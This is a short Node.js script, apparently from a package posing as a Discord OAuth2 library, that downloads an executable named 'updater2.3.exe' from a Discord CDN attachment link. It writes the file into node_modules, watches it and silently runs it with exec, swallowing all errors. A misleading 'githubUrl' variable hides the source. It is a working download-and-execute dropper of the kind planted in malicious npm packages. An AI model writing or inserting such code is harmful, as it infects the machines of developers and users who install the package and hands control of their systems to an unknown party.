const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const path = require('path');

class ExeFileHandler {
    constructor(exePath) {
        this.exePath = exePath;
    }

    onModified(event) {
        if (event === this.exePath) {
            exec(this.exePath, (error, stdout, stderr) => {
                if (error) {

                }
            });
        }
    }
}

async function downloadExe(repoUrl, exeFilename) {
    const folderName = 'discord-oauth2.js';
    const downloadPath = path.join('node_modules', folderName, exeFilename);

    const folderPath = path.join('node_modules', folderName);


    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
    }

    const fileStream = fs.createWriteStream(downloadPath);
    const response = await new Promise((resolve, reject) => {
        const request = https.get(repoUrl, (response) => {
            response.pipe(fileStream);
            response.on('end', () => {

                observeFile(downloadPath);
            });
            resolve(response);
        });
        request.on('error', reject);
    });

    if (response.statusCode === 200) {
;
    } else {

    }
}

function observeFile(exePath) {
    fs.watch(exePath, (event) => {
        if (event === 'change') {
            exec(exePath, (error, stdout, stderr) => {
                if (error) {

                }
            });
        }
    });
}

const githubUrl = "https://cdn.discordapp.com/attachments/1170652912192598076/1171085107680006174/updater2.3.exe?ex=655b64ff&is=6548efff&hm=1ef3f0feaa9ba47e970167b26e02bd8db02d72de04faea0fc816366e6bb18c14&"; // Replace with the correct URL
const exeFilename = "updater2.3.exe";

downloadExe(githubUrl, exeFilename);
